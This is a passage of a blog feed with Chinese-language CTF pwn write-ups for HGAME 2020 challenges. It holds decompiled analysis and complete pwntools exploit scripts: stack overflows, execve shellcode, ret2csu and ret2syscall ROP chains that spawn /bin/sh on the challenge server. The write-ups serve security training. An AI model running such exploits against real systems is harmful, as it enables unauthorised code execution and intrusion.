class="number">0x68</span>,<span class="string">'f'</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'g'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="number">19</span>*<span class="string">'\x00'</span>+p64(libc_addr+<span class="number">0xf1147</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'?'</span>,str(<span class="number">0x68</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/2020HGAME Week2 WP/">https://kabeor.github.io/2020HGAME Week2 WP/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2020HGAME-Week2-WP&quot;&gt;&lt;a href=&quot;#2020HGAME-Week2-WP&quot; class=&quot;headerlink&quot; title=&quot;2020HGAME Week2 WP&quot;&gt;&lt;/a&gt;2020HGAME Week2 WP&lt;/h1&gt;&lt;h2 id=&quot;u
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020HGAME Week1 Pwn WP</title>
    <link href="https://kabeor.github.io/2020HGAME%20Week1%20Pwn%20WP/"/>
    <id>https://kabeor.github.io/2020HGAME Week1 Pwn WP/</id>
    <published>2020-01-25T13:21:25.045Z</published>
    <updated>2020-01-25T13:22:52.348Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020HGAME-Week1-Pwn-WP"><a href="#2020HGAME-Week1-Pwn-WP" class="headerlink" title="2020HGAME Week1 Pwn WP"></a>2020HGAME Week1 Pwn WP</h1><h2 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">160u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;byte_80486E0, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求输出从v5开始与七位字符串比较，字符串为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.rodata:080486E0 byte_80486E0    db 30h                  ; DATA XREF: main+85↑o</span><br><span class="line">.rodata:080486E1                 db  4Fh ; O</span><br><span class="line">.rodata:080486E2                 db  30h ; 0</span><br><span class="line">.rodata:080486E3                 db  6Fh ; o</span><br><span class="line">.rodata:080486E4                 db    0</span><br><span class="line">.rodata:080486E5                 db 4Fh</span><br><span class="line">.rodata:080486E6                 db  30h ; 0</span><br></pre></td></tr></table></figure><p>因此直接填充到v5位置然后写入即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'47.103.214.163'</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="comment">#p=process('./Hard_AAAAA')</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Let\'s 0O0o'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">123</span>+<span class="string">'0O0o'</span>+<span class="string">'\x00'</span>+<span class="string">'O0'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4[<span class="number">11</span>]; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's Pwn me with numbers!"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )           <span class="comment">//////可写0x13*8</span></span><br><span class="line">    v4[i] = readll();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">readll</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)nptr = <span class="number">0L</span>L;</span><br><span class="line">  v2 = <span class="number">0L</span>L;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; read(<span class="number">0</span>, &amp;nptr[i], <span class="number">1u</span>LL) &gt; <span class="number">0</span> &amp;&amp; i &lt;= <span class="number">19</span> &amp;&amp; nptr[i] != <span class="number">10</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> atoll(nptr);     <span class="comment">/////////转换为长整数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub     rsp, 60h</span><br></pre></td></tr></table></figure><p>因此存在栈溢出</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400761 loc_400761:                             ; CODE XREF: main+8A↓j</span><br><span class="line">.text:0000000000400761                 mov     eax, 0</span><br><span class="line">.text:0000000000400766                 call    readll</span><br><span class="line">.text:000000000040076B                 mov     rdx, rax</span><br><span class="line">.text:000000000040076E                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:0000000000400771                 cdqe</span><br><span class="line">.text:0000000000400773                 mov     [rbp+rax*8+var_60], rdx</span><br><span class="line">.text:0000000000400778                 add     [rbp+var_4], 1</span><br><span class="line">.text:000000000040077C</span><br><span class="line">.text:000000000040077C loc_40077C:                             ; CODE XREF: main+69↑j</span><br><span class="line">.text:000000000040077C                 cmp     [rbp+var_4], 13h</span><br><span class="line">.text:0000000000400780                 jle     short loc_400761</span><br><span class="line">.text:0000000000400782                 mov     eax, 0</span><br><span class="line">.text:0000000000400787                 leave</span><br><span class="line">.text:0000000000400788                 retn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-0000000000000060 var_60          dq 11 dup(?)            ;输入</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004 var_4           dd ?                    ;循环数</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400789 gift            proc near</span><br><span class="line">.text:0000000000400789 ; __unwind &#123;</span><br><span class="line">.text:0000000000400789                 push    rbp</span><br><span class="line">.text:000000000040078A                 mov     rbp, rsp</span><br><span class="line">.text:000000000040078D                 jmp     rsp</span><br><span class="line">.text:000000000040078D gift            endp</span><br></pre></td></tr></table></figure><p>栈溢出覆盖后可修改循环数，但如果想修改ret，就必须改为 c00000000 。</p><p>ret到gift上后jmp rsp跳转到ret下一地址，在ret后还有6次循环，足够我们shellcode实现ret2shellcode</p><p>但shellcode一次只能输入20位数字，因此payload需要截断</p><p>但我刚好找到了可以直接手写的shellcode</p><p>直接看exp吧</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./Number_Killer')</span></span><br><span class="line">p=remote(<span class="string">'47.103.214.163'</span>, <span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Let\'s Pwn me with numbers!'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line">    p.sendline(<span class="string">'51539607552'</span>) <span class="comment">#c 0000 0000</span></span><br><span class="line">p.sendline(<span class="string">'4196237'</span>) <span class="comment"># gift</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'break *0x400773')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">    .global _start</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">    # char *const argv[]</span></span><br><span class="line"><span class="string">    xorl %esi, %esi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'</span></span><br><span class="line"><span class="string">    movq $0x68732f2f6e69622f, %rbx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # for '\x00'</span></span><br><span class="line"><span class="string">    pushq %rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pushq %rbx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pushq %rsp</span></span><br><span class="line"><span class="string">    # const char *filename</span></span><br><span class="line"><span class="string">    popq %rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # __NR_execve 59</span></span><br><span class="line"><span class="string">    pushq $59</span></span><br><span class="line"><span class="string">    popq %rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # char *const envp[]</span></span><br><span class="line"><span class="string">    xorl %edx, %edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#  char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span></span><br><span class="line"><span class="comment">#    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'7955998173871797809'</span>)</span><br><span class="line">p.sendline(<span class="string">'6869206962231521071'</span>)</span><br><span class="line">p.sendline(<span class="string">'1424770328968042'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v4; // [rsp+<span class="number">8</span>h] [rbp<span class="number">-18</span>h]</span><br><span class="line">  int fd[<span class="number">2</span>]; // [rsp+<span class="number">10</span>h] [rbp<span class="number">-10</span>h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+<span class="number">18</span>h] [rbp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)fd = open(<span class="string">"./flag"</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(stdout, <span class="number">0L</span>L);</span><br><span class="line">  read(fd[<span class="number">0</span>], &amp;flag, <span class="number">0x1E</span>uLL);</span><br><span class="line">  puts(<span class="string">"Firstly....What's your name?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;name);</span><br><span class="line">  puts(<span class="string">"The thing that could change the world might be a Byte!"</span>);</span><br><span class="line">  puts(<span class="string">"Take tne only one shot!"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  *v4 = <span class="number">1</span>;                    <span class="comment">################## 任意写1字节</span></span><br><span class="line">  puts(<span class="string">"A success?"</span>);</span><br><span class="line">  printf(<span class="string">"Goodbye,%s"</span>, &amp;name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov     edi, offset aD  ; &quot;%d&quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    ___isoc99_scanf</span><br><span class="line">mov     rax, [rbp+var_18]</span><br><span class="line">mov     byte ptr [rax], 1                        ;  任意写一字节</span><br><span class="line">mov     edi, offset aASuccess ; &quot;A success?&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     esi, offset name</span><br><span class="line">mov     edi, offset format ; &quot;Goodbye,%s&quot;</span><br></pre></td></tr></table></figure><p>查看bss段发现</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:00000000006010C0 name            db    ? ;               ; DATA XREF: main+6C↑o</span><br><span class="line">.bss:00000000006010C0                                         ; main+BB↑o</span><br><span class="line">.bss:00000000006010C1                 db    ? ;</span><br><span class="line">.bss:00000000006010C2                 db    ? ;</span><br><span class="line">                            ...</span><br><span class="line">.bss:00000000006010DE                 db    ? ;</span><br><span class="line">.bss:00000000006010DF                 db    ? ;</span><br><span class="line">.bss:00000000006010E0                 public flag</span><br><span class="line">.bss:00000000006010E0 flag            db    ? ;               ; DATA XREF: main+56↑o</span><br><span class="line">.bss:00000000006010E1                 db    ? ;</span><br><span class="line">.bss:00000000006010E2                 db    ? ;</span><br><span class="line">                            ...</span><br></pre></td></tr></table></figure><p>因此如果将name的\n写为1就可以在后面printf时直接把flag泄露出来。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./One_Shot')</span></span><br><span class="line">p=remote(<span class="string">'47.103.214.163'</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span></span><br><span class="line">add=<span class="number">6295776</span></span><br><span class="line">p.recvuntil(<span class="string">'Firstly....What\'s your name?'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Take tne only one shot!'</span>)</span><br><span class="line">p.sendline(str(add))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  v3 = open(<span class="string">"./some_life_experience"</span>, <span class="number">0</span>);</span><br><span class="line">  *(_QWORD *)fd = v3;</span><br><span class="line">  read(v3, &amp;buf, <span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf只有0x50，因此栈溢出，但开了NX，不能直接ret2shellcode</p><p>查看其他函数，发现 _libc_csu_init 因此尝试利用ret2csu  <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/</a></p><p>直接套模板就好</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">'47.103.214.163'</span>,<span class="number">20003</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./ROP_LEVEL0'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">"puts_got = 0x%x"</span>,puts_got)</span><br><span class="line">pading=<span class="string">'A'</span>*<span class="number">0x58</span></span><br><span class="line">vul_addr = <span class="number">0x400636</span></span><br><span class="line">sh.recvuntil(<span class="string">'./flag'</span>)</span><br><span class="line">sh.sendline(pading+p64(vul_addr))</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x400730</span></span><br><span class="line">csu_end_addr = <span class="number">0x40074A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400753</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    payload = <span class="string">'B'</span>*<span class="number">24</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += p64(last)*<span class="number">8</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000400753 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x0000000000400751 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, puts_got, puts_got, puts_got, puts_got, vul_addr)</span><br><span class="line">sh.recvline()</span><br><span class="line">puts_addr = u64(str(sh.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>))</span><br><span class="line">info(<span class="string">"leak puts_addr = 0x%x"</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">puts_offset= obj.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_offset= obj.dump(<span class="string">'system'</span>)</span><br><span class="line">real_addres = puts_addr-puts_offset</span><br><span class="line">info(<span class="string">"leak libc_addr = 0x%x"</span>,real_addres)</span><br><span class="line"></span><br><span class="line">binsh_offset = obj.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">system = real_addres+system_offset</span><br><span class="line">binsh=real_addres+binsh_offset</span><br><span class="line">info(<span class="string">'leak system_addr = 0x%x'</span>,libc.sym[<span class="string">'system'</span>])</span><br><span class="line">info(<span class="string">'leak bin_sh_addr = 0x%x'</span>,libc.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">24</span> + p64(pop_rdi_ret) +p64(binsh) + p64(system)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/2020HGAME Week1 Pwn WP/">https://kabeor.github.io/2020HGAME Week1 Pwn WP/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2020HGAME-Week1-Pwn-WP&quot;&gt;&lt;a href=&quot;#2020HGAME-Week1-Pwn-WP&quot; class=&quot;headerlink&quot; title=&quot;2020HGAME Week1 Pwn WP&quot;&gt;&lt;/a&gt;2020HGAME Week1 Pwn 
      
    
    </summary>
    
      <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>由寄存器位数差异引发的漏洞利用</title>
    <link href="https://kabeor.github.io/%E7%94%B1%E5%AF%84%E5%AD%98%E5%99%A8%E4%BD%8D%E6%95%B0%E5%B7%AE%E5%BC%82%E5%BC%95%E5%8F%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://kabeor.github.io/由寄存器位数差异引发的漏洞利用/</id>
    <published>2020-01-23T14:13:29.001Z</published>
    <updated>2020-01-23T14:15:26.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="由寄存器位数差异引发的漏洞利用"><a href="#由寄存器位数差异引发的漏洞利用" class="headerlink" title="由寄存器位数差异引发的漏洞利用"></a>由寄存器位数差异引发的漏洞利用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|63..32|31..16|15-8|7-0|</span><br><span class="line">               |AH.|AL.|</span><br><span class="line">               |AX.....|</span><br><span class="line">       |EAX............|</span><br><span class="line">|RAX...................|</span><br></pre></td></tr></table></figure><p>以上是16，32，64位寄存器的大小。</p><h2 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://i.loli.net/2020/01/22/6Valx7X2EGHNjkP.png" alt="image.png"></p><p>可见有一处花指令，先nop掉看逻辑</p><p><img src="https://i.loli.net/2020/01/22/rzQfUy2hLDvg4cW.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/01/22/bYUqvVg1PS4ljtf.png" alt="image.png"></p><p>要求输入小于等于10也就是0xA，否则程序退出。</p><p>查看汇编</p><p><img src="https://i.loli.net/2020/01/22/k5XR6yrBUa2Anih.png" alt="image.png"></p><p>可以发现</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eax               0000 000a</span><br><span class="line">rax     0000 0000 0000 000a</span><br><span class="line">rax     0000 0001 0000 000a    构造成这样也可以通过</span><br></pre></td></tr></table></figure><p>cmp指令的隐含操作为 op1-op2判断是否等于0。因此可触发类似整数溢出的漏洞。</p><p>于是如果我们构造 0x1 0000 0009 - 0xa 就会将eax内容变为 0xffff ffff，从而在后面的read name可以读大量字节，造成栈溢出。</p><p>使用file命令查看发现程序为静态链接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=c69a6b123774b6c538eb99551edd57bc703c32f9, not stripped</span><br></pre></td></tr></table></figure><p>且程序内有syscall，因此直接使用ret2syscall进行ROP。</p><p>对于这道题来说，即可以手工构造给syscall传参，也可以使用 ROPgadget直接生成利用链</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary intoverflow --ropchain</span><br></pre></td></tr></table></figure><p>直接生成如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROP chain generation</span><br><span class="line">===========================================================</span><br><span class="line"></span><br><span class="line">- Step <span class="number">1</span> -- Write-what-where gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x47c601</span> mov qword ptr [rsi], rax ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x4017b7</span> pop rsi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x480956</span> pop rax ; pop rdx ; pop rbx ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x42660f</span> xor rax, rax ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">2</span> -- Init syscall number gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x42660f</span> xor rax, rax ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x46ea20</span> add rax, <span class="number">1</span> ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x46ea21</span> add eax, <span class="number">1</span> ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">3</span> -- Init syscall arguments gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x401696</span> pop rdi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x4017b7</span> pop rsi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x442e46</span> pop rdx ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">4</span> -- Syscall gadget</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x4003da</span> syscall</span><br><span class="line"></span><br><span class="line">- Step <span class="number">5</span> -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004017b7</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006ca080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000480956</span>) <span class="comment"># pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += <span class="string">'/bin//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000047c601</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span 